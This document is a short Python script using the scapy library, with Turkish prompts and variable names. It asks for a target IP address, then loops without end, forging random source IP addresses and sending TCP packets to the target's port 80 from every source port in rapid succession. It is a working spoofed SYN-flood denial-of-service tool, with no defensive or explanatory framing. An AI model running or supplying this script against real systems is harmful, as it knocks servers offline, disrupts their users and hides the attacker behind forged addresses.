import random
from scapy.all import *

hedef_IP = input("Hedef IP adresini giriniz")
i = 1

while True:
   ip1 = str(random.randint(1,254))
   ip2 = str(random.randint(1,254))
   ip3 = str(random.randint(1,254))
   ip4 = str(random.randint(1,254))
   nokta = "."
   kaynak_IP = ip1+ nokta + ip2+ nokta + ip3+ nokta + ip4

   for port in range(1, 65535):
        IP1 = IP(src = kaynak_IP, dst = hedef_IP)
        TCP1 = TCP(sport = port, dport = 80)
        packet = IP1 / TCP1
        send(packet, inter = .0001)

        print("paket gönderildi", i)
        i += 1 